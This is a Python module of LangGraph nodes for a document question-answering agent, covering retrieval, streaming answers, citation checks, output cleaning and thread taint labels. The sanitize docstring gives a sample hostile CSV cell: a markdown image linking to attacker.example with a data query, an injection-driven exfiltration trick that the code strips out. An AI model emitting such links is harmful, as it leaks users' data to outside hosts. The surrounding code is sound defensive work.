"""The steps of the answer graph (steps S3.1 to S3.4, PLAN.md §7).

A node is a plain function: it receives the state (and the run's context), does one thing, and
returns *only the keys it changes*. LangGraph merges the returned keys into the state and follows the
edges. Nothing here knows about LangGraph's machinery beyond the ``Runtime`` argument, which is how a
node reaches the retriever, the chat model and the stream writer, so each node can be called directly
in a test.

The nodes are ordinary (synchronous) functions on purpose. When the graph runs with ``astream`` and an
async checkpointer (S3.4: ``geekbot ask --thread``), LangGraph runs a synchronous node in a worker
thread, so the event loop stays free (PLAN.md §6.3) without rewriting a line here.

**One turn, in order** (the wiring is ``agent.graph``): ``begin_turn`` clears what the last turn left in
a saved thread and says what to search for; on a follow-up ``condense`` rewrites the question; then
``retrieve``, and either ``generate`` and ``validate_citations`` or ``no_context``; and ``remember``
writes the turn into the thread's memory last, so a turn that failed is never remembered.
"""

import time
from collections.abc import Callable, Iterable, Sequence
from typing import Any, Final, Literal

from langgraph.runtime import Runtime

from geekbot.agent.citations import check_citations, citing_sentences, is_refusal
from geekbot.agent.condense import CondenseOutput, build_condense_messages, clean_standalone
from geekbot.agent.mode import choose_mode
from geekbot.agent.packing import pack_prompt
from geekbot.agent.runtime import AgentContext
from geekbot.agent.sanitize import StreamSanitizer, sanitize_text, source_urls
from geekbot.agent.state import (
    AgentState,
    CitationScore,
    HistoryMessage,
    SourceRef,
    StreamEvent,
)
from geekbot.domain import Label, ScoredChunk
from geekbot.llm.chat import ChatError
from geekbot.llm.streaming import read_stream

__all__ = [
    "NO_CONTEXT_ANSWER",
    "begin_turn",
    "cite_check",
    "condense",
    "csv_ask",
    "generate",
    "has_sources",
    "label_names",
    "no_context",
    "remember",
    "retrieve",
    "sanitize",
    "section_trail",
    "source_refs",
    "validate_citations",
]

_ERROR_WIDTH: Final = 300  # how much of an error message is kept in the state

# What the user is told when there is nothing to answer from. It starts the way a refusal does
# (``is_refusal``), so a turn that found nothing counts as an abstention like one where the model
# said it could not find the answer (D-082, option B: the model's own refusal, no score gate). The one
# rule behind it is that a model is never asked to answer without sources, because a small model
# would answer from memory.
NO_CONTEXT_ANSWER: Final = "I could not find anything about that in the documents."
_CHECKED_WIDTH: Final = 160  # how much of a checked sentence is kept in the state


def _same_words(left: str, right: str) -> bool:
    return left.casefold().split() == right.casefold().split()


def section_trail(title: str, section_path: Sequence[str]) -> str:
    """The heading trail as ``A > B``, without a first heading that only repeats the title.

    A Markdown file whose first heading is its title would otherwise show up as
    ``Lantern staff FAQ | Lantern staff FAQ > Your conversations``, in the prompt and under the
    answer. Only the first element is compared, ignoring case and spacing.
    """
    trail = list(section_path)
    if trail and _same_words(trail[0], title):
        trail = trail[1:]
    return " > ".join(trail)


def source_refs(chunks: Sequence[ScoredChunk]) -> list[SourceRef]:
    """Retrieved chunks as plain, numbered source records (see ``agent.state.SourceRef``)."""
    return [
        SourceRef(
            n=rank,
            chunk_id=scored.chunk.chunk_id,
            title=scored.chunk.title,
            path=scored.chunk.path,
            page=scored.chunk.page,
            section=section_trail(scored.chunk.title, scored.chunk.section_path),
            text=scored.chunk.text,
            score=scored.score,
        )
        for rank, scored in enumerate(chunks, start=1)
    ]


def label_names(labels: Iterable[Label]) -> list[str]:
    """Labels as sorted plain strings, the form the state keeps them in (a set is not JSON)."""
    return sorted(label.value for label in labels)


def begin_turn(state: AgentState) -> dict[str, Any]:
    """Start a turn: clear what the previous turn of a saved thread left behind.

    With a checkpointer the state is saved after every step and the next question starts from it, so
    a key one turn wrote would still be there in the next: a turn that finds nothing would show the
    previous turn's sources and a reply with no citation check would show its raw text. Every key that
    belongs to one turn is therefore set to its empty value here (the thread's own keys, ``history``,
    ``thread_taint``, ``turn``, ``mode`` and ``csv_file``, are left alone), and the search text starts
    as the user's own words; ``condense`` replaces it on a follow-up. Without a checkpointer this
    changes nothing.

    This is also where the turn's **mode** is settled (C4): the thread's saved mode and the mode the
    caller asked for (``requested_mode``, input only) go through ``choose_mode``, which keeps a saved
    mode, takes the requested one on a thread's first turn and refuses a contradiction (``ModeError``).
    The result is stored in ``mode`` for the router and for the next turn.
    """
    return {
        "mode": choose_mode(state.get("mode"), state.get("requested_mode")),
        "requested_mode": "",
        "csv_status": "",
        "standalone_question": state["question"],
        "condense_seconds": 0.0,
        "condense_error": "",
        "sources": [],
        "retrieval_ms": {},
        "used": 0,
        "history_used": 0,
        "answer": "",
        "raw_answer": "",
        "cited": [],
        "dropped_citations": [],
        "abstained": False,
        "citation_checks": [],
        "citation_check_error": "",
        "removed_markup": [],
        "answer_labels": [],
        "thinking": "",
        "generation": {},
    }


def _one_line(text: str) -> str:
    return " ".join(text.split())[:_ERROR_WIDTH]


def condense(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
    """Rewrite a follow-up into a question that stands on its own (one structured model call).

    The conversation so far and the last message go to the model (``build_condense_messages``); it
    must answer in the shape of ``CondenseOutput``; ``clean_standalone`` checks the text. Whatever
    goes wrong (Ollama down, a reply that is not that shape, an empty or absurd rewrite) the turn
    goes on with the user's own words and the reason is kept in ``condense_error``: a worse search is
    better than a stopped conversation, and the answer step will report a dead model itself. With no
    condenser configured the question is searched for as typed and nothing is recorded. The time the
    call took is kept in ``condense_seconds`` either way.
    """
    context = runtime.context
    question = state["question"]
    if context.condenser is None:
        return {}
    messages = build_condense_messages(
        question, state.get("history", []), budget_tokens=context.history_budget_tokens
    )
    started = time.perf_counter()
    try:
        reply = context.condenser.invoke(messages)
        if not isinstance(reply, CondenseOutput):
            raise TypeError(f"expected a CondenseOutput, got {type(reply).__name__}")
        rewritten = clean_standalone(reply.standalone_question, fallback=question)
    except Exception as error:  # noqa: BLE001  # any failure of the rewrite is survivable, by design
        return {
            "standalone_question": question,
            "condense_seconds": time.perf_counter() - started,
            "condense_error": _one_line(f"{type(error).__name__}: {error}"),
        }
    return {"standalone_question": rewritten, "condense_seconds": time.perf_counter() - started}


def retrieve(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
    """Find the chunks that may answer the question, with the time each stage took.

    What is searched for is ``standalone_question``: the user's words, or on a follow-up their rewrite.
    """
    context = runtime.context
    query = state.get("standalone_question") or state["question"]
    result = context.retriever.search(query, context.top_k)
    return {"sources": source_refs(result.chunks), "retrieval_ms": dict(result.timings_ms)}


def has_sources(state: AgentState) -> Literal["generate", "no_context"]:
    """The graph's one decision (a conditional edge): answer, or say nothing was found."""
    return "generate" if state.get("sources") else "no_context"


def no_context(state: AgentState) -> dict[str, Any]:
    """Answer 'nothing found' without calling the model.

    The answer is the application's own sentence, so it cites nothing and carries no labels: no
    model call happened, and nothing a document wrote went into it (PLAN.md §8.2).
    """
    del state  # the answer does not depend on it
    return {
        "answer": NO_CONTEXT_ANSWER,
        "used": 0,
        "history_used": 0,
        "cited": [],
        "dropped_citations": [],
        "abstained": True,
        "answer_labels": [],
        "generation": {},
    }


def generate(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
    """Ask the chat model to answer from the packed sources, streaming. The S3.1 ✍️ piece.

    ✍️ Written by Claude (prototyping mode, D-047); on the ✍️ backlog in STATUS.md. S3.3 made it
    stream; the reading of the stream is ``llm.streaming.read_stream``. In order:

    1. ``pack_prompt`` builds the messages from the question and the retrieved sources, within the
       context budget. If not even one source fits, the model is not called and the answer is
       ``NO_CONTEXT_ANSWER`` (a model must never answer without sources).
    2. The chat model is called once, as a stream, and every piece is sent to the graph's stream
       writer as it arrives (a ``StreamEvent``; nobody is listening under plain ``invoke``, and the
       writer then does nothing). Any failure (Ollama down, model missing, a server error, a stream
       that breaks half way) becomes a single ``ChatError`` that names the model and keeps the
       original as its cause, so the caller handles one kind of exception whatever library
       raised it.
    3. The reply's text must not be empty: a model that spent its whole budget thinking would
       otherwise produce a blank answer that looks like success. That is a ``ChatError`` too, and
       the message says so when reasoning text did arrive.
    4. The node returns the answer, how many sources the prompt held (``used``), the labels of
       the prompt (they become the answer's, PLAN.md §8.2), the call's readings (``RunStats``,
       time to first token included) and, if the model reasoned, its reasoning. Nothing else
       changes in the state. The answer is still the model's raw text: ``validate_citations``,
       ``cite_check`` and ``sanitize`` run next, after the stream, on the finished text. The
       *stream events* are already cleaned (``agent.sanitize``, S3.5), whatever those later steps do.
    """
    context = runtime.context
    packed = pack_prompt(
        state["question"],
        state["sources"],
        budget_tokens=context.context_budget_tokens,
        history=state.get("history", []),
        history_budget_tokens=context.history_budget_tokens,
    )
    if packed.used == 0:
        return no_context(state)
    emit = runtime.stream_writer
    # G3 (S3.5): what leaves this node as a stream event has been through the output cleaning, the
    # reasoning as well as the answer. A piece that ends inside a possible image or link is held back
    # until it is decided, so nothing the model wrote reaches a screen before it has been checked.
    allowed = source_urls(source["text"] for source in state["sources"][: packed.used])
    cleaners = {"text": StreamSanitizer(allowed), "thinking": StreamSanitizer(allowed)}

    def send(event: Literal["text", "thinking"]) -> Callable[[str], None]:
        def write(piece: str) -> None:
            safe = cleaners[event].feed(piece)
            if safe:
                emit(StreamEvent(event=event, text=safe))

        return write

    # The clock starts before the stream is created, so a model whose `stream` already sends the
    # request when called is not credited with a time to first token it did not have.
    started = time.perf_counter()
    try:
        result = read_stream(
            context.llm.stream(packed.messages),
            started=started,
            on_text=send("text"),
            on_thinking=send("thinking"),
        )
    except Exception as error:
        detail = f"{type(error).__name__}: {error}"
        raise ChatError(f"the chat model {context.model!r} failed ({detail})") from error
    for kind, cleaner in cleaners.items():
        held = cleaner.finish()
        if held:
            emit(StreamEvent(event="text" if kind == "text" else "thinking", text=held))
    if not result.text:
        spent = (
            " (it spent its whole reply budget thinking; raise GEEKBOT_CHAT_THINK_NUM_PREDICT)"
            if result.thinking
            else ""
        )
        raise ChatError(f"the chat model {context.model!r} returned no text{spent}")
    update: dict[str, Any] = {
        "answer": result.text,
        "used": packed.used,
        "history_used": packed.history_used,
        "answer_labels": label_names(packed.labels),
        "generation": result.stats.as_dict(),
    }
    if result.thinking:
        update["thinking"] = result.thinking
    return update


def validate_citations(state: AgentState) -> dict[str, Any]:
    """Remove the ``[n]`` marks from the answer that name no source the prompt held (S3.2).

    The model's own text is kept as ``raw_answer`` so nothing is lost (an evaluation can compare the
    two); ``answer`` becomes the checked text, ``cited`` the marks that remain and
    ``dropped_citations`` the numbers that were removed. A reply that was nothing but invalid marks
    would become an empty answer, which is an error like any other empty reply, not a blank result.
    """
    raw = state["answer"]
    check = check_citations(raw, state["used"])
    if not check.text:
        raise ChatError("the chat model's reply held nothing but citations to missing sources")
    return {
        "answer": check.text,
        "raw_answer": raw,
        "cited": list(check.cited),
        "dropped_citations": list(check.dropped),
        # D-082, option B: the model's own refusal is the abstention. A reply that starts like a
        # refusal and cites a source is a partial answer, not an abstention.
        "abstained": is_refusal(check.text) and not check.cited,
    }


def cite_check(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
    """Score every citation against the sentence that makes it (the relevance check of S3.5).

    A valid ``[n]`` only means source ``n`` was in the prompt (``validate_citations``); it says
    nothing about whether that source supports the claim. This step asks the cross-encoder (the same
    model that reranks) how well each cited source's text fits the sentence that cites it, and marks
    the ones below ``citation_weak_below`` as weak. It is a *relevance* check, not entailment, and
    **it only reports**: the answer is never changed, and nothing is retried. It runs after the
    stream, so it adds nothing to the time to first token. It is skipped, silently, when there is no
    scorer (no reranker in this run) or nothing is cited; and it can never fail a turn: a scorer
    that raises is recorded in ``citation_check_error`` and the answer stands.
    """
    context = runtime.context
    scorer = context.citation_scorer
    if scorer is None or not state.get("cited"):
        return {"citation_checks": [], "citation_check_error": ""}
    sources = state["sources"]
    checks: list[CitationScore] = []
    try:
        for sentence, numbers in citing_sentences(state["answer"], state["used"]):
            scores = scorer.score(sentence, [sources[n - 1]["text"] for n in numbers])
            for n, score in zip(numbers, scores, strict=True):
                checks.append(
                    CitationScore(
                        n=n,
                        score=round(score, 3),
                        weak=score < context.citation_weak_below,
                        sentence=sentence[:_CHECKED_WIDTH],
                    )
                )
    except Exception as error:  # noqa: BLE001  # a report must never stop an answer
        detail = _one_line(f"{type(error).__name__}: {error}")
        return {"citation_checks": [], "citation_check_error": detail}
    return {"citation_checks": checks, "citation_check_error": ""}


def sanitize(state: AgentState) -> dict[str, Any]:
    """Clean the finished reply of images and outside links (G3, S3.5), on both branches.

    The stream events were cleaned as they went (``generate``); this is the same cleaning of the
    finished text, so the answer that is saved, returned and shown after the stream is exactly as
    safe as what the stream showed. In CSV mode it is the only cleaning there is: a cell of the file
    can hold ``![x](https://attacker.example/?q=...)`` and the package's reply repeats cells. The
    addresses a link may keep are those in the sources the prompt held (none, in CSV mode). What
    was removed is listed in ``removed_markup`` so the user can be told. A reply that is nothing but
    removed markup is an error like any other empty reply, not a blank answer.
    """
    used = int(state.get("used", 0))
    allowed = source_urls(source["text"] for source in state.get("sources", [])[:used])
    result = sanitize_text(state["answer"], allowed)
    if not result.text.strip():
        raise ChatError("the reply held nothing but images or links that were removed")
    return {
        "answer": result.text.strip(),
        "removed_markup": [f"{item.kind}: {item.target}" for item in result.removed],
    }


def csv_ask(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
    """Answer from the thread's CSV file (CSV mode, step C4): one call into the copied package.

    The package has no memory, so what it is asked is ``standalone_question``: the user's words on a
    first turn, and on a follow-up the rewrite that ``condense`` made with the CSV model (PLAN.md
    §6.7). The call blocks for seconds, which is why this is a plain node: LangGraph runs it in a
    worker thread and the event loop stays free (§6.3). Every status the package can report
    (answered, abstained, needs clarification, failed) is an answer the user should read, so all of
    them come back as the turn's ``answer``; only an exception is an error, and it is wrapped in a
    ``ChatError`` like a failed chat model.

    The answer is labelled ``TOOL`` and ``USER`` (PLAN.md §8.2): its text is built from the cells of a
    file someone else wrote, which can say anything, so the thread becomes tainted exactly as it does
    from documents. There are no sources and no citations. The readings are the time the package took
    and how long Ollama spent loading the model for it (rule R-2), under the keys the terminal prints.
    """
    context = runtime.context
    if context.csv is None:
        raise ChatError("this is a CSV conversation but no CSV file is loaded")
    question = state.get("standalone_question") or state["question"]
    try:
        reply = context.csv.ask(question)
    except Exception as error:
        detail = f"{type(error).__name__}: {error}"
        raise ChatError(f"the CSV analyst ({context.model!r}) failed ({detail})") from error
    text = reply.markdown.strip()
    if not text:
        raise ChatError(f"the CSV analyst ({context.model!r}) returned no text")
    return {
        "answer": text,
        "used": 0,
        "answer_labels": label_names({Label.USER, Label.TOOL}),
        "csv_status": reply.status,
        "generation": {"seconds": reply.seconds, "load_seconds": reply.model_load_ms / 1000},
    }


def remember(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
    """Write this turn into the thread's memory: the question, the answer, their labels, the taint.

    The last step of a turn, so a turn that raised an error half way is never remembered (the
    conversation does not contain an answer the user never got). Two messages are appended: the
    question (``USER``) and the answer, which carries ``answer_labels``, the labels of everything in
    the prompt that produced it (none for the application's own "nothing found" sentence). Only the
    newest ``history_keep_messages`` are kept, always whole turns, so the checkpoint does not grow
    for ever; forgetting a message does **not** forget its taint: ``thread_taint`` is the union of
    every label the thread has ever carried and only grows (PLAN.md §8.2: monotonic, no
    declassification, so a thread cannot be cleaned by letting a tainted answer scroll away).
    """
    turn = state.get("turn", 0) + 1
    labels = sorted(set(state.get("answer_labels", [])))
    asked = HistoryMessage(
        id=f"t{turn}-user", role="user", content=state["question"], labels=[Label.USER.value]
    )
    answered = HistoryMessage(
        id=f"t{turn}-assistant", role="assistant", content=state["answer"], labels=labels
    )
    kept = [*state.get("history", []), asked, answered]
    keep = max(2, runtime.context.history_keep_messages)
    kept = kept[-(keep - keep % 2) :]  # whole turns: an even number of messages
    taint = sorted({*state.get("thread_taint", []), Label.USER.value, *labels})
    return {"history": kept, "thread_taint": taint, "turn": turn}
